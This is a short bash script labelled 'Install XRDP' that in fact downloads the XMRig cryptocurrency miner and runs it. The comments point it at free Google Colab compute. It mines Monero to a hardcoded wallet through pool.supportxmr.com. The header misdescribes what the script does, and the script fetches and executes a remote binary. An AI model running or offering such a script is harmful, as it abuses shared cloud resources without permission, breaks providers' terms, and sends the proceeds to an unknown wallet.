#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
cd xmrig-6.16.4
./xmrig --donate-level 5 -o pool.supportxmr.com:443 -u 4AmkCSg7SAPKvKNuzygrvQSX7Qzi5UP6nJXKSR3h3ptadaumfctokpMKqv3E6bMNKVEsDfwwVXmqHcGZpVBZDk5MBetLS4P -k --tls -p siam
